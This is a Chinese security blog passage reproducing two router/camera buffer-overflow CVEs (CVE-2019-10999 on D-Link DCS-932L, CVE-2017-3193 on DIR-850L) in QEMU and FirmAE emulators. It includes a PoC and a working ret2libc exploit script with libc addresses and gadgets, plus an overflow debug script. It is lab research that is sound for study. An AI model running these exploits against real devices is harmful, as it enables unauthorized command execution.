-<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><h3 id="使用-qemu-system-static-搭建"><a href="#使用-qemu-system-static-搭建" class="headerlink" title="使用 qemu-system-static 搭建"></a>使用 qemu-system-static 搭建</h3><p>漏洞环境搭建先是使用 qemu-mipsel-static 搭建。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 进入固件的根目录 复制 qemu-mipsel-static 到根目录</span><br><span class="line">cp $(which qemu-mipsel-static) ./</span><br><span class="line"># 使用 qemu 启动服务器 alphapd</span><br><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/alphapd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-2023-0412-184727655.png" alt="undifined"></p>
-<p>根据逆向中的反编译代码提示，是因为需要打开 &#x2F;var&#x2F;run&#x2F;nvramd.pid 文件，那么在固件根目录创建 run 目录和 nvramd.pid 文件。</p>
-<p>创建 pid 文件之后，继续运行依旧报错，无法创建 RSA 密钥，应该是缺少 urandom、random 设备造成的，手动在固件根目录创建。</p>
-<p><img src="/images/image-2023-0412-184754978.png" alt="undifined"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/random c 1 8</span><br><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/urandom c 1 9</span><br></pre></td></tr></table></figure>
-
-<p><strong>报错 unable to write ‘random state’</strong></p>
-<p><img src="/images/image-2023-0412-184812215.png" alt="undifined"></p>
-<p>OpenSSL 需要写入一些信息到 .rnd 文件，上面的错误可能是因为 .rnd 文件不存在，OpenSSL 不知道默认文件在何处，因为 RANDFILE 和 HOME 环境变量没有设置，那么解决方法就是创建 .rnd 文件并且设置环境变量指向这个文件。qemu 启动的时候设置这两个环境变量，解决了上面的问题。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch .rnd</span><br><span class="line">sudo chroot . ./qemu-mipsel-static -E HOME=/ -E RANDFILE=/.rnd ./bin/alphapd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-2023-0412-184826317.png" alt="undifined"></p>
-<p><strong>Can’t get lan ip from sysinfo</strong></p>
-<p>通过搜索字符串定位到在 websStartupServer 函数中，通过调用 getSysInfoLong 获取，在 getSysInfoLong 函数中是通过 &#x2F;dev&#x2F;gpio 设备获取到，可以通过 patch getSysInfoLong 函数，或者在 websStartupServer 中 patch 地址判定代码。此处选择 patch 后者，就可以让程序在 0.0.0.0:80 端口运行起来。</p>
-<p>如下是 websStartupServer  的地址判定处反编译，以及 patch 的基本块：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v3 = getSysInfoLong(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v3</span><br><span class="line">  &amp;&amp; (v5 = (<span class="type">const</span> <span class="type">char</span> *)nvram_bufget(<span class="number">0</span>, <span class="string">&quot;IPAddress&quot;</span>),</span><br><span class="line">      trace(<span class="number">0</span>, <span class="string">&quot;Can&#x27;t get lan ip from sysinfo!\n&quot;</span>, v4),</span><br><span class="line">      v3 = inet_addr(v5),</span><br><span class="line">      v3 == <span class="number">-1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  trace(<span class="number">0</span>, <span class="string">&quot;failed to convert %s to binary ip data&quot;</span>, v5);</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v6 = inet_ntoa(v3);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-2023-0412-184918114.png" alt="undifined"></p>
-<p>重新运行如下：</p>
-<p><img src="/images/image-2023-0412-184935970.png" alt="undifined"></p>
-<p><img src="/images/image-2023-0412-184949952.png" alt="undifined"></p>
-<h3 id="使用-qemu-system-mipsel-搭建"><a href="#使用-qemu-system-mipsel-搭建" class="headerlink" title="使用 qemu-system-mipsel 搭建"></a>使用 qemu-system-mipsel 搭建</h3><p>发现使用 qemu 搭建的调试，使用 gdb-multiarch 连接不上去，于是采用了 qemu-system-mipsel 虚拟机来搭建，进入固件根目录。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chroot . /bin/mknod -m 0666 /dev/random c 1 8</span><br><span class="line">chroot . /bin/mknod -m 0666 /dev/urandom c 1 9</span><br><span class="line"></span><br><span class="line">touch .rnd</span><br><span class="line">export HOME=.</span><br><span class="line">export RANDFILE=$HOME/.rnd</span><br><span class="line"></span><br><span class="line">chroot . ./bin/alphapd_patch_j</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-2023-0412-185007135.png" alt="undifined"></p>
-<p><img src="/images/image-2023-0412-185021356.png" alt="undifined"></p>
-<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>漏洞触发代码如下，也可以看到成功触发了 segment fault。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">Headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">    &#x27;Connection&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">    &#x27;Referer&#x27;: &#x27;http://192.168.100.2/setSystemWireless&#x27;,</span><br><span class="line">    &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">data = &#x27;?WEPEncryption=&#x27; + &#x27;A&#x27; * 0x28 + &#x27;B&#x27; * 0x4</span><br><span class="line">res = session.get(url=&#x27;http://192.168.100.2/wireless.htm&#x27; + data, headers=Headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-2023-0412-185041489.png" alt="undifined"></p>
-<p>在 QEMU 虚拟机中开启 alphapd，然后使用 gdbserver attach 上 server 的进程，通过 12345 端口提供调试</p>
-<p><img src="/images/image-2023-0412-185058909.png" alt="undifined"></p>
-<p>使用 gdb 调试，如下，保存在栈上的函数返回地址被 BBBB 字符串覆盖</p>
-<p><img src="/images/image-2023-0412-185247615.png" alt="undifined"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>接下来的步骤就是寻找环视 的 gadget，从栈中获取数据设置 system 函数传入的命令，并跳转到 system 函数执行。</p>
-<p>这个地方需要说一下，不能在 alphapd 中去直接寻找 gadget，因为 alphapd 的代码段装载在低地址空间，其中的 gadget 地址高位前两位是 00，通过 url 传递地址会发生截断。因此可以先看 alphapd 装载了哪些 so 文件，从 so 中去寻找 system 函数和 gadget。此处选择了 libuClibc-0.9.28.so ，因为通过 ldd 查看 alphapd 装载的 so 文件，其中有 libc.so，libc.so 链接指向 libuClibc-0.9.28.so。</p>
-<p>这个地方是在 QEMU 虚拟机中通过查看 map 文件获取 ibuClibc-0.9.28.so 的装载地址的，如果在实际应用中，需要能够进入设备，从设备上查看 so 的装载地址以及是否开启了随机化，但是一般低端路由器中都是比较老的 Linux 系统，没有地址随机化，那么在 QEMU 中也关闭了地址随机化。此处选择了第一个装载的 libc.so.0 的基址：0x77ed0000</p>
-<p>然后获取到 system 函数相对装载地址的偏移是 0x0004BD20，得到 system 函数的地址为 0x77ed0000 + 0x0004BD20 &#x3D; 0x77F1BD20</p>
-<p>在 IDA 中，对 ibuClibc-0.9.28.so 使用 mipsrop.stackfinder()，找到如下的 gadget，同样计算出地址为 0x77ed0000 + 0x00050DE4 &#x3D; 0x77F20DE4</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00050DE4 addiu   $s2, $sp, 0x1C8+var_D8</span><br><span class="line">.text:00050DE8 move    $a0, $s2</span><br><span class="line">.text:00050DEC move    $t9, $s0</span><br><span class="line">.text:00050DF0 jalr    $t9 ; </span><br></pre></td></tr></table></figure>
-
-<p>gadgets 的功能是将 sp + 0x1c8 - 0xd8 处数据传递给 a0，然后跳转到 S0 寄存器中去执行。通过前面对于缓冲区溢出的分析知道 S0 可控，写入 0x10 个字节开始控制 S0 寄存器，写入 0x28 个字节开始控制返回地址。那么整体的利用过程就是：</p>
-<ul>
-<li>写入累计 0x10 个字节后，控制 S0 寄存器值为 system 函数地址</li>
-<li>写入累计 0x28 个字节后，控制 ra 寄存器值为 gadget 地址</li>
-<li>跳转到 system 函数，执行构造的字符串命令。此时已经恢复了堆栈， 从恢复的 sp + 0x1c8 - 0xd8 取出命令开始执行</li>
-</ul>
-<p>exp 根据 poc 简单修改如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://192.168.100.2/setSystemWireless&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">data = <span class="string">&#x27;?WEPEncryption=&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span> + <span class="string">&#x27;%20%BD%F1%77&#x27;</span> + <span class="string">&#x27;B&#x27;</span> * (<span class="number">0x28</span> - <span class="number">0x10</span> - <span class="number">0x4</span>) + <span class="string">&#x27;%E4%0D%F2%77&#x27;</span> + (<span class="number">0x30</span> - <span class="number">0x28</span> - <span class="number">0x4</span> + <span class="number">0x1c8</span> - <span class="number">0xd8</span>) * <span class="string">&#x27;C&#x27;</span> + <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">res = session.get(url=<span class="string">&#x27;http://192.168.100.2/wireless.htm&#x27;</span> + data, headers=Headers)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
-
-<p>执行结果如下，执行命令 ls</p>
-<p><img src="/images/image-2023-0412-185122923.png" alt="undifined"></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文先分析了漏洞原理，然后分别从 qemu 的两种方式仿真将 alphapd 启动起来进行调试，然后通过 ret2libc 对漏洞实现利用。</p>
-<p>漏洞原理还是比较简单的，仅仅是一个缓冲区溢出 + ret2libc的操作。但是实际利用的话，也许还需要获得设备，通过其他方式例如 UART 等先获取到一个 shell，然后看程序的 so 加载内存布局获取到基址。此外，漏洞是将路由器后端 server 发生了栈溢出的，触发 segment fault，如果路由器没有对 server 的守护进程或者看门狗，那么 server 就挂了。如果要稳定利用，可以考虑反弹一个 telnet 回来或者是在 exp 中通过 shellcode 重新启动 server。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10999">[cve.mitre.org] CVE-2019-10999 概述</a></li>
-<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5681">[先知社区] CVE-2019-10999复现</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/tacnetsol/CVE-2019-10999">[github] CVE-2019-10999</a></li>
-<li>[[固件下载] DCS-932L_REVA_FIRMWARE_1.14.04.ZIP](<a target="_blank" rel="noopener" href="https://us.softpedia-secure-download.com/dl/1987a9330e759255a393a795437da31e/61839716/300596532/drivers/network">https://us.softpedia-secure-download.com/dl/1987a9330e759255a393a795437da31e/61839716/300596532/drivers/network</a> camera&#x2F;DCS-932L_REVA_FIRMWARE_1.14.04.ZIP)</li>
-<li><a target="_blank" rel="noopener" href="https://bobcares.com/blog/openssl-unable-to-write-random-state-unable-to-write-random-state/">How to fix openssl error “unable to write ‘random state’”?</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2017-3193%20dir-850l%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="ToT">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/12/CVE-2017-3193%20dir-850l%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">CVE-2017-3193 dir-850l缓冲区溢出</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-04-12 06:41:22 / Modified: 18:44:49" itemprop="dateCreated datePublished" datetime="2023-04-12T06:41:22+08:00">2023-04-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h2><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞的产生是因为 hnap_main 函数中在拼接字符串的时候，没有对源字符串和目的字符串的大小进行限制，导致栈溢出。如下是 strcat 的函数原型。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>dest：目的字符串指针</li>
-<li>src：源字符串指针</li>
-</ul>
-<p>strcat 函数将 src 指向的字符串复制到 dest 字符串尾部，dest 原本末尾的 NULL 结束符被覆盖，并在连接完 src 字符串后重新加上 NULL 字符串。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcat</span>(v74, v4);</span><br></pre></td></tr></table></figure>
-
-<p>漏洞发生在如上代码，其中 v74 是栈上的内存空间，起始地址为 sp + 0xB30，v4 是获取到的环境变量 HTTP_SOAPACTION 的地址，存放在 _start 函数的栈中。在逆向 hnap_main 函数，初始化的过程是将调用返回地址（存放在 ra 寄存器中）保存到栈上 sp + 0xD34 + 0x20。通过计算，可以得出 v74 起始地址相对于栈上的返回地址偏移是 0x224 也就是 548 个字节大小，那么通过控制环境变量字符串的大小，就可以覆盖掉返回地址。</p>
-<h2 id="环境搭建-FirmAE"><a href="#环境搭建-FirmAE" class="headerlink" title="环境搭建 FirmAE"></a>环境搭建 FirmAE</h2><p>对于 IoT 尤其是路由器仿真环境的搭建，这个地方强烈安利一个框架那就是 FirmAE。FirmAE 是一个仿真成功率比较高的框架，也是基于 Firmadyne 开发的，开发者声称可以达到 79.36% 的成功率，而以往使用比较多的 Firmadyne 在相同固件测试集是 16.28%。这些成功率都分别是各自的论文数据支撑，有感兴趣的师傅可以去翻看一下。</p>
-<p>FirmAE 的安装步骤可以参考 GitHub 上的帮助文档，此处不多说了，主要是想说一下他的一个 debug 选项，可以极大减少环境搭建时间。平常手动搭建 qemu 系统级仿真环境，主要是解压固件，配置网络，然后上传对应架构的 gdbserver，如果是程序对于硬件、网络的一些依赖，还需要手动去 patch。但是 FirmAE 框架中对这些操作进行了集成。下面说一下具体的使用方法。</p>
-<p>如果是仿真的话，先将固件（未加密可被 binwalk 正常解压）复制到 FirmAE 根目录的 firmwares 文件夹中，然后使用 run.sh 进行操作，例如下面是对 dir-850 的仿真步骤：</p>
-<p><img src="/images/image-2023-0412-184204018.png" alt="undifined"></p>
-<p>需要说明一下 -r 后的参数指的是固件的品牌，例如 dir 系列、netgear 系列等等。然后使用浏览器访问 192.168.0.1 就可以访问到路由器界面了。</p>
-<p><img src="/images/image-2023-0412-184219976.png" alt="undifined"></p>
-<p>仿真的流程通过脚本的输出可以看到，和手动搭建系统级仿真环境类似，是解压固件获取相关信息，创建虚拟机和宿主机的桥接网络，然后仿真。</p>
-<p>如上是单纯搭建仿真环境而已，接下来要说一下 FirmAE 提供的一个超级实用的技能，那就是调试选项 -d，如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./run.sh -d dir firmwares/DIR850LB1_FW207WWb05</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-2023-0412-184233481.png" alt="undifined"></p>
-<p>如上图，-d 选项提供了连接到 socat、shell、tcpdump 甚至 gdbserver 也集成到里面了，那就不需要再像以前那样手动去搭建系统级环境。为了调试的方便，我写了一个 shell 脚本上传到虚拟机中，设置调试 cgibin 所需要的环境变量，循环检测 gdbserver 是否已经挂掉等等。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/firmadyne/sh</span></span><br><span class="line">export REQUEST_METHOD=POST</span><br><span class="line">export HTTP_HNAP_AUTH=&quot;BBD0605AF8690024AF8568BE88DD7B8E 1482588069&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=OLnLaWBI8S&quot;</span><br><span class="line">export HTTP_REFERER=&quot;http://192.168.0.1/info/Login.html&quot;</span><br><span class="line">export HTTP_SOAPACTION=&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaaf&quot;</span><br><span class="line">ProcNumber=`ps | grep gdbserver | grep -v grep | wc -l`</span><br><span class="line">source /firmadyne/setenv.sh</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    echo $ProcNumber</span><br><span class="line">    if [ $ProcNumber -le 0 ];then</span><br><span class="line">        echo &quot;gdbserver not run&quot;</span><br><span class="line">        /firmadyne/gdbserver 0.0.0.0:12345 hnap hnap</span><br><span class="line">    else</span><br><span class="line">        echo &quot;gdbserver is running&quot;</span><br><span class="line">        sleep 5</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-
-<p>运行的时候让脚本在后台运行，这样如果是因为 gdbserver 报错或者是卡住了，可以直接杀掉进程。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/firmadyne/checkgdb.sh &gt; ./log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
-
-<p>然后在宿主机中，使用 gdb-multiarch + pwndbg 设置远程调试，就可以愉快进行调试了。顺便说一下，pwngdb + tmux 是天作之合。</p>
-<p><img src="/images/image-2023-0412-184251456.png" alt="undifined"></p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>当时在调试的时候，遇见的问题如下：</p>
-<ol>
-<li><p>cgibin</p>
-<p>在 cgibin 的 main 函数中，先获取第一个运行参数到 v4，然后通过 strrchr检测 v4 中 &#x2F; 的位置并赋值给 v6。如果 &#x2F; 存在，那么将 v4 指向 &#x2F; 后的一个地址。为了方便，直接将 cgibin 程序名改为了 hnap，这样在调试的时候就直接在 main 函数中比较字符串跳转到调用 hnap_main 中了。关键反编译代码如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v4 = *argv;</span><br><span class="line">v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">  v4 = v6 + <span class="number">1</span>;</span><br><span class="line">......</span><br><span class="line">  v36 = <span class="built_in">strcmp</span>(v4, <span class="string">&quot;hnap&quot;</span>);</span><br><span class="line">v8 = envp;</span><br><span class="line"><span class="keyword">if</span> ( !v36 )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = (<span class="type">int</span> (*)())hnap_main;</span><br><span class="line">  v10 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v9)(v10, argv, v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>gdbserver 设置环境变量</p>
-<p>一开始自己是在 gdb-multiarch 中去设置环境变量，但是这样是设置到了宿主机的 gdb-multiarch 运行环境，正确的做法是设置到 gdbserver 的运行环境中，也就是上面在调试脚本中先设置了环境变量，然后再启动 gdbserver。简单说一下路由器环境中 cgi 调用的参数传递，一般都是在路由器的 server 例如 httpd、lighttpd 等通过设置环境变量的方式传递参数，然后调用 cgi 读取环境变量进行数据处理，再通过 stdout 将结果返回到 server中。</p>
-</li>
-</ol>
-<p>设置好环境变量后，就可以开始进行调试了</p>
-<p>通过分析可以知道如果要运行到存在漏洞 strcat 函数调用处，也就是 0x414A14 处如下，基本块的执行顺序是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00414A14 move    $a0, $s2         # dest</span><br><span class="line">.text:00414A18 lw      $gp, 0xD34+var_D14($sp)</span><br><span class="line">.text:00414A1C la      $t9, strcat</span><br><span class="line">.text:00414A20 jalr    $t9 ; strcat</span><br><span class="line">.text:00414A24 move    $a1, $s1         # src</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4141C4 -&gt; 0x4141E0 -&gt; 0x4141FC -&gt; 0x41431C -&gt; 0x414970 -&gt; 0x414978 -&gt; 0x414998 -&gt; 0x4149B4</span><br></pre></td></tr></table></figure>
-
-<p>通过 cyclic 获取一个长度为 560 字节的字符串，然后赋值给 HTTP_SOAPACTION 环境变量，启动调试，运气比较不错直接可以执行到 0x4149B4。再打一个断点到最后 hnap_main 的结束处，就可以看到发生了栈溢出，返回地址已经被覆盖然后赋值给 ra 寄存器，PC 再从 ra 寄存器中取出来执行发生错误。</p>
-<p><img src="/images/image-2023-0412-184309161.png" alt="undifined"></p>
-<p>此处的计算出来的偏移是 538，因为 v74 是先将 v6（HTTP_HNAP_AUTH）通过空格分隔然后将第二部分固定的 10 个字节复制进去，然后才是通过 v4（HTTP_SOAPACTION）拼接，造成缓冲区溢出。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(v58, v27 + <span class="number">4</span>, <span class="number">0xA</span>u);</span><br><span class="line">v28 = strtok(v6, <span class="string">&quot; &quot;</span>);                    <span class="comment">// v6 为 HTTP_HNAP_AUTH 环境变量，以空格分隔</span></span><br><span class="line">v29 = strtok(<span class="number">0</span>, <span class="string">&quot; &quot;</span>);                     <span class="comment">// v28 第一个部分</span></span><br><span class="line"><span class="built_in">strcpy</span>(v74, v29);                         <span class="comment">// v29 第二个部分</span></span><br><span class="line"><span class="built_in">strcat</span>(v74, v4);                          <span class="comment">// 上面的 strcpy 也存在缓冲区溢出</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>分析完毕了，其实就是比较简单的一个缓冲区溢出漏洞，可以开始编写利用脚本了。</p>
-<p>目标程序没有开启堆栈不可执行，就直接在栈上写代码吧，而且自己太菜，没有找到合适的控制 $r0 的 rop 控制链。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00415BCC jr      $ra</span><br><span class="line">.text:00415BD0 addiu   $sp, 0x1A8</span><br><span class="line">x/4c $sp + 0xD34 + 0x20</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
